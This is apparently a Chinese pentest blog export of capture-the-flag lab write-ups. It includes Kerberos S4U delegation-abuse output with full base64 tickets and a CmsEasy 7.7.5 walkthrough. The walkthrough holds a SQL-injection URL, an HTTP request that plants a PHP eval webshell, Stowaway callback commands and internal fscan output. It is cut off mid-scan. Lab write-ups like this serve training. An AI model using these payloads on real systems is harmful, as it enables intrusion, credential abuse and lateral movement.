doIFyDCCBcSgAwIBBaEDAgEWooIE0jCCBM5hggTKMIIExqADAgEFoRAbDkFPU0VMVUFVVE8uQ09NoiMwIaADAgECoRowGBsGa3JidGd0Gw5hb3NlbHVhdXRvLmNvbaOCBIYwggSCoAMCARKhAwIBAqKCBHQEggRwrVpnEQTRcPwKEGTj4yiq2VU2FNbLvbQDI6UZiqsOrXJfls7bHIjGoq3t7Icr0oQZGWP1y5cH9TOhTc8ORrEJCqHLcACL0PqSZPHzH41LE5TZLE9F1B8nIJUNiulPEA7a44CypiPgwStXmPOoZ3ogtFtaeRyorxctv9JT+OqTQHDDPmiNQ4BATaiZD/L66iFeEYpQg2T3cmaVtaHRuKb7RDLSmjZEl9J7jV1djJ6puQGbM4Z5dTNa7gtA9sXeGravEM/ZYlI0CgrtdI+ycZr6CFaaaq+w6OVLnSMfZbOLyrroGq8W1XUkJLLVSzub++gZYhZPdpV0opIKGXEbEc5WLPqqwF7uu4Un5zcGWgBaYNVBNssz0SlPkuuBHqL8O+c/Xw5dkBhT14MmUuEkGjEuaZizpKnjkkoTnM30rOQFgoougrXg5YHTEW3PApkyvJ1cLqLzLGb3nai2fkhrENfVLAuMHb13DRF9J9YvVFK6EWgHp/tkGDs4ssd1mX25j9c+ysWLDlJBtmZa+GAiw3GoBM1FE3e/<span class="number">9</span>XcomslY1kCPe0mQzChd7e5nDOEsDGuXMVLEeRBBpdKpc2ts2yH8UQe5StHm0UVg7p+qZRbjvxOjLLdnndszlbNrsrPaTOWJ0VKAlqbCzq/WAC0vlLpUJJU8PmMkQ2IXSC1jitgjCQCtXDzHo9GxpTvA1223zy0WKjH9oGNjydATVNlWxpHiW6FxwLi6cNUJHz4nUR8ojaE04kOE+oy8<span class="built_in">R</span>+CBDKLuPgLvHczcSWNOjn2ub+QOyPd7uNTS7JeXTT/<span class="number">9</span>Lxph/SJXgxXDAmcCdBaRt+qrQhUZ66J2bnJh01Ww1VPOUrP9K/J4tigPVYShf+Ec0LB27VvEEWjkVYwc+ja3aXeNosBOKHRKpZhKYWxEu6V5klHunlorEAeiEwvN8eBvH/<span class="number">1</span>U5nHxS7XDOuMK7umljcZFNZwTwE3P+<span class="number">6</span>ugT2YysxeVsqchYrN3ERA7cT8nDxxlcXbCFH3pBKPewfK58WUcFgk3AjN/u4cS0f5AkuyUu7UsBz32w/wZIZ+WWx3KfX7Z/uOicU8XxGzh7T1lLqbaoTWerFQGpkW/ZHx2I7zZzisOhVAv6ByvEEbSnp0LM9WsK7h4W5/scDy6r0/oCbIeNhdkrT0vPDKddAjal/Ac5ijsjQQdvx6wYHHM71fuKVwp0YT1e3M8BeG1j2RJtPLWsllBxL5G3ABTqsoRcDOOJ0C/XSqHMbV81x134B2OXKAFiAcm/yTIn+obY3oruTa9yiFVptNV9Z2y/WS9Tw9lDP8UkWW90dBZXZ7/zxJb4LKI9vIeJtWQHPRWURYriTll/<span class="number">4</span>tSPuH7vdxPmRI5uGDMXZPKJ22GjkUKlDD5kreUztrVPRTxOsN5QNfx+<span class="number">6</span>vuHClPJNKZOrb6nEKHVc6aoYCECH+I3mp3sewvqXINuukoXO3J67OaJGWNDj7gx1cr7dQbezbf+<span class="number">7</span>rLX15R9amuAH6mtUxk41zDhbrAMY0pyqfVH2aSaM8DRSqAs0iIH/qjgeEwgd6gAwIBAKKB1gSB032B0DCBzaCByjCBxzCBxKAbMBmgAwIBF6ESBBBCqKpwfqZaa5ChsHi9ePVLoRAbDkFPU0VMVUFVVE8uQ09NohowGKADAgEBoREwDxsNRVZJTENPTVBVVEVSJKMHAwUAQOEAAKURGA8yMDI1MDcxMTAyMzMzNFqmERgPMjAyNTA3MTExMjMzMzRapxEYDzIwMjUwNzE4MDIzMzM0WqgQGw5BT1NFTFVBVVRPLkNPTakjMCGgAwIBAqEaMBgbBmtyYnRndBsOYW9zZWx1YXV0by5jb20=</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Action: S4U</span><br><span class="line"></span><br><span class="line">[*] Building S4U2self request <span class="keyword">for</span>: <span class="string">&#x27;EVILCOMPUTER$@AOSELUAUTO.COM&#x27;</span></span><br><span class="line">[*] <span class="keyword">Using</span> domain controller: ASLSRVAD05.aoseluauto.com (172.16.34.5)</span><br><span class="line">[*] Sending S4U2self request to <span class="number">172.16</span>.<span class="number">34.5</span>:<span class="number">88</span></span><br><span class="line">[+] S4U2self success!</span><br><span class="line">[*] Got a TGS <span class="keyword">for</span> <span class="string">&#x27;SVC_ADM01&#x27;</span> to <span class="string">&#x27;EVILCOMPUTER$@AOSELUAUTO.COM&#x27;</span></span><br><span class="line"><span class="function">[*] <span class="title">base64</span></span>(ticket.kirbi):</span><br><span class="line"></span><br><span class="line">      doIF2jCCBdagAwIBBaEDAgEWooIE4TCCBN1hggTZMIIE1aADAgEFoRAbDkFPU0VMVUFVVE8uQ09NohowGKADAgEBoREwDxsNRVZJTENPTVBVVEVSJKOCBJ4wggSaoAMCARehAwIBAqKCBIwEggSIug+EBZSZFHHAH9tkO+plUR8UzEukA/<span class="number">1</span>Do3dt72tjWWWWqpqTxYA/BOlL3IDYlwR7P9yie9RPExsixRT4/b5G4NLXCpNvgg+kayJlygkA3WFl7jdvFKKMXU4riDP650dObWTADk91I+N0D8/FlgjhEJ2FdJJP7jWi/oLWDaUmDfInc8UYWo2pGK/EdNFuyLJXK8+<span class="built_in">R</span>/hHsZ8Tp8fV/MUa5AA+Gk/t15lShi5jONDwkMxlPraZFHjvqCCdBsWaDIy+qqJKjptxWZuBbJys8mL+dG5Nnb4ktL1abcaHWfsC2nbRJhNzGmhEd6SQa0/<span class="number">6</span>+<span class="number">9</span>mpL1Dx/OtonPz0ODRkiSfrHfC6XQCiZ9z2TzoufyCSlvEqettrT+kh1+<span class="number">3</span>hqbxZvXt5<span class="built_in">r</span>+<span class="number">2</span>/ngiZQVAXk4dUb8ZUGa8W+n5F5Skn8tcDb/dp3Q13vnjRKnmrp+K6Dbl3P10PDGWi+l23c7+I1QLZtSeRztFe7fMELbcSNbBKlxVIespzoJ5CiGa5b8ZQg7kIwjg90149UQtzMhAPMhBqz8cOwI2/QuNDZm6kwYf00+OmbRyxJWWA2K4<span class="built_in">rd</span>/wvrdajrQzKcDu81nC7AMqBViWLbBuHYbd6YIE1sCV5EdjpAGLy7DnazkIJhh/HhjKOsNlBilKJWt1feIelIkk4MTwiorfFGsMgwzpG/XO07taIj/ubr/GQ7VWutvEsODs44tprxTbCPHV59beoSfpCsVofdstAvFD5hgkCAx9SsXMz+MspsHvXPcV8DIBPvonLXR3jUD+MAH+Jpd2JX9FA6kYPaQgOnOaTNmrfeVtTByTzVnMYDxtoNdugKUAPfdEfW4jzuPYgE8JTxcyFAWb/piqPRtKP/<span class="number">4</span>+nBHTUC9nQKtrisuf86MpDM4r2lp8oTTm5qQw7TeFq8AgI5+vjcJWxHV0LBi1v0HYGA517l4YSo7svJPiXgCPbKxjlZenD/bDoyzw683/tKAvdqjpFKJSPLtgcJqTFm1DOnM4cYl2dfWnRtay4ikRONW07Isy6RUW3XXmgJX7WFaL+<span class="built_in">r</span>/Yl7mcxawJ+mvbNM3CYbclkQBgVdEFXIYUkeCAyrVNomfemF/zC0aJKanEVw92bt5j4cZJWe+<span class="number">2</span>kZvd4UPl6v/Wja3e07iEg9cILLUsGk3H45eb7eplKtvlWI4cdbjouI3/alWrw1MlCBERjZo07jwgskzH56FhVCOdcfcchJqV8ALxlr+dZCISqxnw9hkMcwGF6MXZQNFgCn0PGkEGS9dGN8OIyvsCFu7ZsRl5dZNj0I3Js5182Qy6pnwJkoDf6rQSxxCpnIj0IHmbANIIXLm77FP6sRrRSvogXgvvjAgkjNxfUDqj1m2IKLDrBz7kfXahxtf3/zP/Ja3t8LAMQRHpi92fOve2MdjHZ4FdBNh5kzIsMxRppQNqGjqNQrSnYxawXRqvUJwkdi/Pqj7c2jlfbKH3pt1ZNsFHgA6RutNhYMxs3lDu6sygfkvKO5rnGCwC7HeJb2tG6sntexTdIiDGkvBlbSTsPgi+Uj+doofG2IPVtPTL64OTK2msa5Esx9laYTeA+jgeQwgeGgAwIBAKKB2QSB1n2B0zCB0KCBzTCByjCBx6ArMCmgAwIBEqEiBCDdYyP549SCIWh7jhS9GUm80Jh4W8KGmXR05c/keKd2wKEQGw5BT1NFTFVBVVRPLkNPTaIWMBSgAwIBCqENMAsbCVNWQ19BRE0wMaMHAwUAQKEAAKURGA8yMDI1MDcxMTAyMzMzNFqmERgPMjAyNTA3MTExMjMzMzRapxEYDzIwMjUwNzE4MDIzMzM0WqgQGw5BT1NFTFVBVVRPLkNPTakaMBigAwIBAaERMA8bDUVWSUxDT01QVVRFUiQ=</span><br><span class="line"></span><br><span class="line">[*] Impersonating user <span class="string">&#x27;SVC_ADM01&#x27;</span> to target SPN <span class="string">&#x27;cifs/ASLSRVAD05&#x27;</span></span><br><span class="line">[*] Building S4U2proxy request <span class="keyword">for</span> service: <span class="string">&#x27;cifs/ASLSRVAD05&#x27;</span></span><br><span class="line">[*] <span class="keyword">Using</span> domain controller: ASLSRVAD05.aoseluauto.com (172.16.34.5)</span><br><span class="line">[+] S4U2proxy success!</span><br><span class="line"><span class="function">[*] <span class="title">base64</span></span>(ticket.kirbi) <span class="keyword">for</span> SPN <span class="string">&#x27;cifs/ASLSRVAD05&#x27;</span>:</span><br><span class="line">      doIGbDCCBmigAwIBBaEDAgEWooIFgDCCBXxhggV4MIIFdKADAgEFoRAbDkFPU0VMVUFVVE8uQ09Noh0wG6ADAgECoRQwEhsEY2lmcxsKQVNMU1JWQUQwNaOCBTowggU2oAMCARKhAwIBBKKCBSgEggUkLZkKhTOz63Ar1yoHyShTa33Mwk7l8nmO1MhZKlCNq4y4B2olujKqUIRWQVJ0WwF11Oe/rDHgcRdMzFYzRIfi2Eoi3ZpQYNM9bOyQw1J50wLcUXBhubLxN60tcd3TOmUzUZV/eHUdovTi5C2Ne8jSNJAzS9YZ5TYdD5jYlVj5Riqe0RYRMsPn7h2GqGHXKiIYdD8tfOzGUFtVVILLgSkzTGomxrwTXAT4KuwTfyrIB+wgtvnMlJnwABbWTsf9oyqaCNSALcaXFrdeHz75B/PcIDxzBiGdtxbNT0X/<span class="number">0</span>SyrrOb59TivoldXGpFI3cpqeGu6kFG1up7sNUHXQIlK0RapxkUPPm7ZqJZf1koLUaCotsDd3tfgT3KFVU6TmlbC9f15<span class="built_in">rM</span>++xnO+a/u8lrxSW4J2rTBpVMM5Dk4Ft3dnIXXDwrNFhrJyoPCb+Uin1t0sgqBzw3sghXCdHCh3XR+KDwH85YNKOW2Z5XGT98<span class="built_in">RV</span>/vIbisZOkGuJhINuDx+<span class="number">78</span>BLFZkHga/<span class="number">3</span>m+Qfo0XixuqctWzS43QtyUEDbN4ZR2Mh8Gk4bUgPlu4V5xZkD7Z9VkBIzLK5cnKsf3MPe+<span class="number">5</span>VfjV0StNPtZdI8Sy6HbMxrfHPOgIfWY6xSQQLlJSQBjGp5asnz0/qdILaxJQHR3ZUweqkwWutQfcZDbyJvboZYm3q8FvZVB/rsDng/RJ2AZbaBBJ4Gg0PVB+ayWgfld1SWBKKAZHsh6HDAfWtPzaRpac5fC82XU84Tkz5ETI1SC0Pt9siR8tzl/<span class="number">7</span>gHCfTSZanRkKevlOcPRy/SBBDOQAlLECQ+zvG1zY2VdW5geIBLWiz5vsAGHEMsT20JxcdYy4biQpdGCH7OlZ6waY55KUWYzfB8JdqDIVtX6mIu17QoVICcT9SkGSbv5OO2/ZZnuHv0fWEr2YcFz2LJeQ6XGkupoSySC6XmFeZK4VoQLNW/cC7pIxNSUYRwD4Fji/Xp6eNecgpPKb8A88Wtk0kNS5hxNx8PnZ3EM2iLB6Jv0/aDVsS03lvmbbl96Y/fxIqlkOv5Ha5Ycctz1ZCUzCHBNKxgrE+/rGbAicXp7jpfW+tmFB3ahxt93Vt8gPqUormfi6cJlpqAjqYZJihO8evp4EBtHyW1woxtoLNdRu5wyBlTqxXaCCYOd5VAY+kLVKeXB0Ca9JO/gw8ENBMOHwryLghijhRI2uFdmrsT2JVGEGkGMs/<span class="number">0</span>adHmnfk2gOXFetBum0kq3CcBEbIYIvRLnPG1njxobdr9icq6xKTfJB5zqJUQUP1g1OwkSEt4N9MWkdNEDdVoIUy3j5J2gA2Tna+<span class="number">3</span>UCii+e+VBdXQcPVyxVrR2sP5oYxD36zSDGnGEybw2M09nwmLcQIEIR9MlrWTBSwdt3XeeVaYsmmKhZZE+sp69xxepu3eIvqe/Z8VzqDs4CMy2fXfgD7b+nEaxizmIKEyV8oAqAQHtgBizgDuVta2q4upceWjBNl4cE7FcNG00EOz1J4+<span class="number">4</span>vuOzk0EkuNv38AB6YFkmaqd/d25GYMMbGAw+DV2RXfeSQNTAsEEGtQLcSu41Om+DaTT6nYnD1EZKFm4B/gPup8+W132ERvAkNQAttCmE/cexJQqWOGBKvF8kYhtIYV/yhHYDVezNKCCWxb74sU/dk9yMhTyMgY8rvqrGbuUWpEuKAlIQXapXj4xblVEuyjX2SHsoX08djV6mSJnm7MyhZfExK+<span class="number">9</span>U+Br/HDDMJe9DdFckDPqPuNY2cFSxV1VLrAf+zZM3qxIlffl/FCjgdcwgdSgAwIBAKKBzASByX2BxjCBw6CBwDCBvTCBuqAbMBmgAwIBEaESBBAnZJ0Ft2p1FZUvi88r5CdCoRAbDkFPU0VMVUFVVE8uQ09NohYwFKADAgEKoQ0wCxsJU1ZDX0FETTAxowcDBQBApQAApREYDzIwMjUwNzExMDIzMzM0WqYRGA8yMDI1MDcxMTEyMzMzNFqnERgPMjAyNTA3MTgwMjMzMzRaqBAbDkFPU0VMVUFVVE8uQ09NqR0wG6ADAgECoRQwEhsEY2lmcxsKQVNMU1JWQUQwNQ==</span><br><span class="line">[+] Ticket successfully imported!</span><br><span class="line"></span><br><span class="line">C:\users\Administrator\desktop&gt;<span class="built_in">dir</span> \\ASLSRVAD05\\C<span class="variable">$</span></span><br><span class="line">The specified path is invalid.</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次打靶，出现了很多实战中可能出现的情况，比如不出网，wd，远程密码获取lsass.dmp等</p><p>然后进一步明确了我内网信息收集的路线</p><ol><li>dumphash</li><li>fscan</li><li>winlogin</li><li>rdp凭证获取</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 靶机渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cyberstrikelab-lab9</title>
      <link href="/post/633b4305.html"/>
      <url>/post/633b4305.html</url>
      
        <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>开局一个ip</p><p><a href="http://172.5.33.6/">172.5.33.6</a></p><p>fscan扫一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">D:\red\内网\免杀工具包\免杀工具包\fscan2.0.1&gt;fscan.exe -h 172.5.33.6</span><br><span class="line">┌──────────────────────────────────────────────┐</span><br><span class="line">│    ___                              _        │</span><br><span class="line">│   / _ \     ___  ___ _ __ __ _  ___| | __    │</span><br><span class="line">│  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    │</span><br><span class="line">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span><br><span class="line">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span><br><span class="line">└──────────────────────────────────────────────┘</span><br><span class="line">      Fscan Version: 2.0.1</span><br><span class="line"></span><br><span class="line">[2025-05-21 18:35:48] [INFO] 开始信息扫描</span><br><span class="line">[2025-05-21 18:35:48] [INFO] 最终有效主机数量: 1</span><br><span class="line">[2025-05-21 18:35:48] [INFO] 开始主机扫描</span><br><span class="line">[2025-05-21 18:35:48] [INFO] 使用所有可用插件（已排除本地敏感插件）</span><br><span class="line">[2025-05-21 18:35:48] [INFO] 有效端口数量: 233</span><br><span class="line">[2025-05-21 18:35:48] [SUCCESS] 端口开放 172.5.33.6:80</span><br><span class="line">[2025-05-21 18:35:50] [SUCCESS] 端口开放 172.5.33.6:135</span><br><span class="line">[2025-05-21 18:35:50] [SUCCESS] 端口开放 172.5.33.6:139</span><br><span class="line">[2025-05-21 18:35:53] [SUCCESS] 端口开放 172.5.33.6:445</span><br><span class="line">[2025-05-21 18:35:57] [SUCCESS] 端口开放 172.5.33.6:3306</span><br><span class="line">[2025-05-21 18:36:40] [INFO] 存活端口数量: 5</span><br><span class="line">[2025-05-21 18:36:40] [INFO] 开始漏洞扫描</span><br><span class="line">[2025-05-21 18:36:41] [SUCCESS] 网站标题 http://172.5.33.6         状态码:200 长度:77277  标题:中文 网页标题</span><br><span class="line">[2025-05-21 18:36:43] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.5.33.6</span><br><span class="line">主机名: WIN-784BAKDI0AC</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.5.33.6</span><br><span class="line">      └─ 10.6.6.10</span><br><span class="line">[2025-05-21 18:39:23] [SUCCESS] 扫描已完成: 9/9</span><br></pre></td></tr></table></figure><h1 id="外围打点"><a href="#外围打点" class="headerlink" title="外围打点"></a>外围打点</h1><h2 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h2><p>扫的过程中访问一下80端口</p><p>看见**<font style="color:rgb(51, 51, 51);">CmsEasy</font>**</p><p>搜历史漏洞</p><p>看见说url加上&#x2F;admin为后台路径</p><p><a href="http://172.5.33.6/">http://172.5.33.6/</a>admin</p><p>就可以看见版本了</p><p>再根据版本**<font style="color:rgb(51, 51, 51);">CmsEasyV7.7.5</font>**<font style="color:rgb(51, 51, 51);">搜索历史漏洞</font></p><p><a href="https://www.saury.net/919.html">https://www.saury.net/919.html</a></p><p>这有个sql注入直接注出账号密码</p><p>cmd5上解密得密码为admin123456</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.5.33.6//?case=crossall&amp;act=execsql&amp;sql=Ud-ZGLMFKBOhqavNJNK5WRCu9igJtYN1rVCO8hMFRM8NIKe6qmhRfWexXUiOqRN4aCe9aUie4Rtw5</span><br></pre></td></tr></table></figure><p><img src="/img/cyberstrikelab-lab9/1.png"></p><p>然后找后台rce</p><p><a href="https://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%92%8C%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#%E5%AE%89%E8%A3%85%E5%8C%85%E4%B8%8B%E8%BD%BD">https://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%92%8C%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E&#x2F;#%E5%AE%89%E8%A3%85%E5%8C%85%E4%B8%8B%E8%BD%BD</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?case=template&amp;act=save&amp;admin_dir=admin&amp;site=default HTTP/1.1</span><br><span class="line">Host: 172.5.33.6</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 98</span><br><span class="line">Origin: http://172.5.33.6</span><br><span class="line">Sec-Gpc: 1</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Referer: http://172.5.33.6/index.php?case=template&amp;act=save&amp;admin_dir=admin&amp;site=default</span><br><span class="line">Cookie: PHPSESSID=budvv591qp9v5g56cn1jh2vsn7; loginfalse=0; lockingfalseadmin=4; lockingfalsecmseasy=3; lockingfalseadmin1231231=1; login_username=admin; login_password=9776624e56cfa87e5d04672056ffeac9</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">sid=#data_d_.._d_.._d_.._d_1.php&amp;slen=693&amp;scontent=&lt;?php echo 123;eval($_POST[&#x27;a&#x27;]);phpinfo();?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上传后文件位于根目录</p><p><a href="http://172.5.33.6/1.php">http://172.5.33.6/1.php</a></p><p><img src="/img/cyberstrikelab-lab9/2.png"></p><p>连接蚁剑</p><p><img src="/img/cyberstrikelab-lab9/3.png"></p><p><img src="/img/cyberstrikelab-lab9/4.png"></p><h1 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h1><h2 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h2><p>这里我以为还是外网vps，结果相当于内网的环境</p><p>这里传的话建议本地起个vshell传文件，或者python开web服务传</p><p>因为蚁剑传的工具不完整</p><p>先传stowaway上去（因为其可以开个伪交互式shell）</p><h3 id="挂载代理"><a href="#挂载代理" class="headerlink" title="挂载代理"></a>挂载代理</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">windows_x64_admin.exe -l 1122</span><br><span class="line"></span><br><span class="line">windows_x64_agent.exe -c 172.16.233.2:1122</span><br></pre></td></tr></table></figure><p><img src="/img/cyberstrikelab-lab9/5.png"></p><p><img src="/img/cyberstrikelab-lab9/6.png"></p><p>搭建sock隧道</p><p><img src="/img/cyberstrikelab-lab9/7.png"></p><p>stowaway直接开shell</p><p>由于第一台的flag 我们已经找到了，那这里就不提权了</p><p>直接内网横向</p><p><img src="/img/cyberstrikelab-lab9/8.png"></p><p>看到另一个内网段为</p><p>10.6.6.10&#x2F;24</p><p>上传fscan扫内网</p><p>这里一开始上传的2.0.1版本，发现扫不全</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Public&gt;fscan.exe -h 10.6.6.10/24</span><br><span class="line">fscan.exe -h 10.6.6.10/24</span><br><span class="line">┌──────────────────────────────────────────────┐</span><br><span class="line">│    ___                              _        │</span><br><span class="line">│   / _ \     ___  ___ _ __ __ _  ___| | __    │</span><br><span class="line">│  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    │</span><br><span class="line">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span><br><span class="line">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span><br><span class="line">└──────────────────────────────────────────────┘</span><br><span class="line">      Fscan Version: 2.0.1</span><br><span class="line"></span><br><span class="line">[2025-05-21 11:39:10] [INFO] 开始信息扫描</span><br><span class="line">[2025-05-21 11:39:10] [INFO] CIDR范围: 10.6.6.0-10.6.6.255</span><br><span class="line">[2025-05-21 11:39:10] [INFO] generate_ip_range_full</span><br><span class="line">[2025-05-21 11:39:10] [INFO] 解析CIDR 10.6.6.10/24 -&gt; IP范围 10.6.6.0-10.6.6.255</span><br><span class="line">[2025-05-21 11:39:10] [INFO] 最终有效主机数量: 256</span><br><span class="line">[2025-05-21 11:39:10] [INFO] 开始主机扫描</span><br><span class="line">[2025-05-21 11:39:10] [INFO] 使用所有可用插件（已排除本地敏感插件）</span><br><span class="line">[2025-05-21 11:39:10] [SUCCESS] 目标 10.6.6.10       存活 (ICMP)</span><br><span class="line">[2025-05-21 11:39:10] [SUCCESS] 目标 10.6.6.55       存活 (ICMP)</span><br><span class="line">[2025-05-21 11:39:10] [SUCCESS] 目标 10.6.6.88       存活 (ICMP)</span><br><span class="line">[2025-05-21 11:39:13] [INFO] 存活主机数量: 3</span><br><span class="line">[2025-05-21 11:39:13] [INFO] 有效端口数量: 233</span><br><span class="line">[2025-05-21 11:39:13] [SUCCESS] 端口开放 10.6.6.10:80</span><br><span class="line">[2025-05-21 11:39:13] [SUCCESS] 端口开放 10.6.6.55:80</span><br><span class="line">[2025-05-21 11:39:16] [SUCCESS] 端口开放 10.6.6.55:88</span><br><span class="line">[2025-05-21 11:39:18] [SUCCESS] 端口开放 10.6.6.55:139</span><br><span class="line">[2025-05-21 11:39:18] [SUCCESS] 端口开放 10.6.6.10:139</span><br><span class="line">[2025-05-21 11:39:18] [SUCCESS] 端口开放 10.6.6.88:135</span><br><span class="line">[2025-05-21 11:39:18] [SUCCESS] 端口开放 10.6.6.55:135</span><br><span class="line">[2025-05-21 11:39:18] [SUCCESS] 端口开放 10.6.6.10:135</span><br><span class="line">[2025-05-21 11:39:18] [SUCCESS] 端口开放 10.6.6.88:139</span><br><span class="line">[2025-05-21 11:39:18] [SUCCESS] 端口开放 10.6.6.55:389</span><br><span class="line">[2025-05-21 11:39:19] [SUCCESS] 端口开放 10.6.6.88:445</span><br><span class="line">[2025-05-21 11:39:19] [SUCCESS] 端口开放 10.6.6.55:445</span><br><span class="line">[2025-05-21 11:39:19] [SUCCESS] 端口开放 10.6.6.10:445</span><br><span class="line">[2025-05-21 11:39:28] [SUCCESS] 端口开放 10.6.6.10:3306</span><br><span class="line">[2025-05-21 11:40:23] [INFO] 存活端口数量: 14</span><br><span class="line">[2025-05-21 11:40:23] [INFO] 开始漏洞扫描</span><br><span class="line">[2025-05-21 11:40:24] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 10.6.6.55</span><br><span class="line">主机名: DC</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 10.6.6.55</span><br><span class="line">[2025-05-21 11:40:24] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 10.6.6.10</span><br><span class="line">主机名: WIN-784BAKDI0AC</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.5.33.6</span><br><span class="line">      └─ 10.6.6.10</span><br><span class="line">[2025-05-21 11:40:24] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 10.6.6.88</span><br><span class="line">主机名: cyberweb</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 10.6.6.88</span><br><span class="line">[2025-05-21 11:40:24] [SUCCESS] 网站标题 http://10.6.6.10          状态码:200 长度:77286  标题:中文 网页标题</span><br><span class="line">[2025-05-21 11:40:24] [SUCCESS] NetBios 10.6.6.88       cyberweb.cyberstrikelab.com         Windows Server 2016 Standard 14393</span><br><span class="line">[2025-05-21 11:40:24] [INFO] 系统信息 10.6.6.88 [Windows Server 2016 Standard 14393]</span><br><span class="line">[2025-05-21 11:40:26] [SUCCESS] 网站标题 http://10.6.6.55          状态码:200 长度:703    标题:IIS Windows Server</span><br><span class="line">[2025-05-21 11:40:28] [INFO] 